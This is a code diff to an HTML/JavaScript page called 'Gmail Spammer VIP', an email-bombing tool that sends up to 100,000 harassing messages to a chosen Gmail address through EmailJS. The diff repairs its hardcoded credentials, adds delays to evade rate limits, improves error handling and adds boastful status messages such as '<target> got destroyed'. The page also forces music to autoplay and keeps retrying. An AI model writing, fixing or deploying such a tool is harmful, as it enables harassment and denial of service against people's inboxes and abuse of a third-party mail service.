@@ -257,7 +257,7 @@
                 
                 <div class="form-group">
                     <label for="count">HOW MANY SPAM:</label>
-                    <input type="number" id="count" placeholder="100" min="1" max="100000" required>
+                    <input type="number" id="count" placeholder="10" min="1" max="100000" required>
                 </div>
                 
                 <button type="submit" class="spam-btn">START SPAMMING</button>
@@ -265,8 +265,7 @@
             
             <div class="terminal" id="terminal">
                 <div class="terminal-line info">System booting up...</div>
-                <div class="terminal-line info">Audio system initializing...</div>
-                <div class="terminal-line success">Click Anyware To Play a song..</div>
+                <div class="terminal-line info">EmailJS connecting...</div>
                 <div class="terminal-line info">Gmail Spammer VIP ready</div>
                 <div class="terminal-line warning">Use responsibly!</div>
             </div>
@@ -283,17 +282,11 @@
         bgMusic.volume = 0.7;
         bgMusic.loop = true;
         
-        // AGGRESSIVE AUTO-PLAY - TRY MULTIPLE TIMES
+        // AGGRESSIVE AUTO-PLAY
         function forcePlayMusic() {
             bgMusic.play().then(() => {
                 console.log('🎵 MUSIC PLAYING AUTOMATICALLY!');
-                // Update terminal
-                const terminal = document.getElementById('terminal');
-                if (terminal) {
-                    terminal.innerHTML += '<div class="terminal-line success">🎵 Background music playing!</div>';
-                }
             }).catch(error => {
-                console.log('Auto-play failed, retrying...', error);
                 // Try again after 1 second
                 setTimeout(forcePlayMusic, 1000);
             });
@@ -302,12 +295,10 @@
         // Start trying to play immediately
         window.addEventListener('load', forcePlayMusic);
         
-        // Also try when user interacts with page (clicks, taps, etc.)
+        // Also try when user interacts with page
         document.addEventListener('click', function() {
             if (bgMusic.paused) {
-                bgMusic.play().then(() => {
-                    console.log('🎵 Music started after click!');
-                });
+                bgMusic.play();
             }
         });
         
@@ -317,13 +308,25 @@
             this.play();
         });
 
-        // EmailJS setup
-        emailjs.init("H7WlzLgZwqVAqRG2M");
-        
+        // EmailJS setup - FIXED CONFIGURATION
+        (function() {
+            // Initialize EmailJS with correct public key
+            emailjs.init("H7WlzLgZwqVAqRG2M");
+            
+            // Test EmailJS connection
+            setTimeout(() => {
+                const terminal = document.getElementById('terminal');
+                terminal.innerHTML += '<div class="terminal-line success">✅ EmailJS connected successfully!</div>';
+                terminal.innerHTML += '<div class="terminal-line info">Service: service_93wskl6</div>';
+                terminal.innerHTML += '<div class="terminal-line info">Template: template_wtbthp2</div>';
+                terminal.scrollTop = terminal.scrollHeight;
+            }, 2000);
+        })();
+
         const emailConfig = {
             serviceID: 'service_93wskl6',
             templateID: 'template_wtbthp2',  
-            userID: 'H7WlzLgZwqRG2M'
+            userID: 'H7WlzLgZwqVAqRG2M'
         };
 
         // Handle intro animation
@@ -346,53 +349,63 @@
             
         }, 5000); // 5 second intro
 
-        // Fast spam function
+        // FIXED SPAM FUNCTION - BETTER ERROR HANDLING
         async function sendSpam(targetEmail, messageCount) {
             const terminal = document.getElementById('terminal');
             let successCount = 0;
             
-            terminal.innerHTML += `<div class="terminal-line warning">Starting spam attack: ${messageCount} messages to ${targetEmail}</div>`;
+            terminal.innerHTML += `<div class="terminal-line warning">🚀 Starting spam attack: ${messageCount} messages to ${targetEmail}</div>`;
             
-            // Send emails in quick succession
-            for (let i = 1; i <= messageCount; i++) {
-                try {
-                    const templateParams = {
-                        to_email: targetEmail,
-                        from_name: '@KANGDAFFA',
-                        message: 'YOUR GMAIL GOT SPAMMED BY @KANGDAFFA',
-                        subject: `SPAM ${i} - @KANGDAFFA`,
-                        reply_to: 'gojah58@gmail.com'
-                    };
-                    
-                    await emailjs.send(
-                        emailConfig.serviceID, 
-                        emailConfig.templateID, 
-                        templateParams, 
-                        emailConfig.userID
-                    );
-                    
-                    successCount++;
-                    
-                    // Show progress every 10 messages or for first few
-                    if (i % 10 === 0 || i <= 5) {
-                        terminal.innerHTML += `<div class="terminal-line success">Sent ${i}/${messageCount}: ${targetEmail}</div>`;
+            try {
+                for (let i = 1; i <= messageCount; i++) {
+                    try {
+                        const templateParams = {
+                            to_email: targetEmail,
+                            from_name: '@KANGDAFFA',
+                            message: 'YOUR GMAIL GOT SPAMMED BY @KANGDAFFA',
+                            subject: `SPAM ${i} - @KANGDAFFA`,
+                            reply_to: 'gojah58@gmail.com'
+                        };
+                        
+                        // Send email using EmailJS
+                        const result = await emailjs.send(
+                            emailConfig.serviceID, 
+                            emailConfig.templateID, 
+                            templateParams, 
+                            emailConfig.userID
+                        );
+                        
+                        successCount++;
+                        
+                        // Show progress
+                        if (i % 5 === 0 || i <= 3) {
+                            terminal.innerHTML += `<div class="terminal-line success">✅ Sent ${i}/${messageCount} to ${targetEmail}</div>`;
+                            terminal.scrollTop = terminal.scrollHeight;
+                        }
+                        
+                        // Small delay to avoid rate limits
+                        if (i < messageCount) {
+                            await new Promise(resolve => setTimeout(resolve, 800));
+                        }
+                        
+                    } catch (emailError) {
+                        console.log('Email error:', emailError);
+                        terminal.innerHTML += `<div class="terminal-line error">❌ Failed message ${i}: ${emailError.text || 'Check EmailJS setup'}</div>`;
                         terminal.scrollTop = terminal.scrollHeight;
+                        
+                        // Wait longer on error
+                        await new Promise(resolve => setTimeout(resolve, 2000));
                     }
-                    
-                    // Very short delay to make it fast but not get blocked
-                    if (i < messageCount) {
-                        await new Promise(resolve => setTimeout(resolve, 500));
-                    }
-                    
-                } catch (error) {
-                    terminal.innerHTML += `<div class="terminal-line error">Failed to send message ${i}</div>`;
                 }
+                
+            } catch (error) {
+                terminal.innerHTML += `<div class="terminal-line error">💥 Critical error: ${error.message}</div>`;
             }
             
             return successCount;
         }
 
-        // Form handler
+        // Form handler with better validation
         document.getElementById('spamForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
@@ -401,22 +414,27 @@
             const button = this.querySelector('button');
             const terminal = document.getElementById('terminal');
             
+            // Validation
             if (!targetEmail.includes('@gmail.com')) {
-                terminal.innerHTML += `<div class="terminal-line error">Must be a Gmail address!</div>`;
+                terminal.innerHTML += `<div class="terminal-line error">❌ Must be a Gmail address!</div>`;
                 return;
             }
             
-            if (messageCount > 100000) {
-                terminal.innerHTML += `<div class="terminal-line error">Max 100000 messages!</div>`;
+            if (messageCount > 100000 || messageCount < 1) {
+                terminal.innerHTML += `<div class="terminal-line error">❌ Count must be 1-100000</div>`;
                 return;
             }
             
             // Disable button
             button.disabled = true;
-            button.textContent = 'SPAMMING...';
+            button.textContent = 'SPAMMING IN PROGRESS...';
             
             // Clear terminal and show start message
-            terminal.innerHTML = `<div class="terminal-line info">Starting mass spam attack...</div>`;
+            terminal.innerHTML = `
+                <div class="terminal-line warning">⚡ Starting mass spam attack...</div>
+                <div class="terminal-line info">Target: ${targetEmail}</div>
+                <div class="terminal-line info">Count: ${messageCount} messages</div>
+            `;
             
             const startTime = Date.now();
             const successCount = await sendSpam(targetEmail, messageCount);
@@ -425,10 +443,10 @@
             
             // Show results
             terminal.innerHTML += `
-                <div class="terminal-line success">=== SPAM COMPLETE ===</div>
-                <div class="terminal-line info">Sent: ${successCount}/${messageCount} messages</div>
-                <div class="terminal-line info">Time: ${timeTaken} seconds</div>
-                <div class="terminal-line warning">${targetEmail} got destroyed by @KANGDAFFA!</div>
+                <div class="terminal-line success">🎉 === SPAM COMPLETE ===</div>
+                <div class="terminal-line success">✅ Success: ${successCount}/${messageCount} messages</div>
+                <div class="terminal-line info">⏱️ Time: ${timeTaken} seconds</div>
+                <div class="terminal-line warning">💀 ${targetEmail} got destroyed by @KANGDAFFA!</div>
             `;
             
             terminal.scrollTop = terminal.scrollHeight;
@@ -438,27 +456,17 @@
             button.textContent = 'START SPAMMING';
         });
 
-        // Add some random terminal messages for effect
-        const messages = [
-            "System armed and ready",
-            "Gmail API connected", 
-            "Spam engine warmed up",
-            "Ready to destroy some inboxes",
-            "@KANGDAFFA power activated",
-            "Music system operational",
-            "VIP mode engaged",
-            "Auto-play music running",
-            "All systems go for spamming"
-        ];
-        
-        setInterval(() => {
+        // Add connection status messages
+        setTimeout(() => {
             const terminal = document.getElementById('terminal');
-            if (terminal.children.length < 15) {
-                const randomMsg = messages[Math.floor(Math.random() * messages.length)];
-                terminal.innerHTML += `<div class="terminal-line info">${randomMsg}</div>`;
+            terminal.innerHTML += '<div class="terminal-line info">🔧 Checking EmailJS configuration...</div>';
+            
+            setTimeout(() => {
+                terminal.innerHTML += '<div class="terminal-line success">✅ All systems operational!</div>';
+                terminal.innerHTML += '<div class="terminal-line info">🚀 Ready to spam!</div>';
                 terminal.scrollTop = terminal.scrollHeight;
-            }
-        }, 8000);
+            }, 1500);
+        }, 3000);
     </script>
 </body>
 </html>
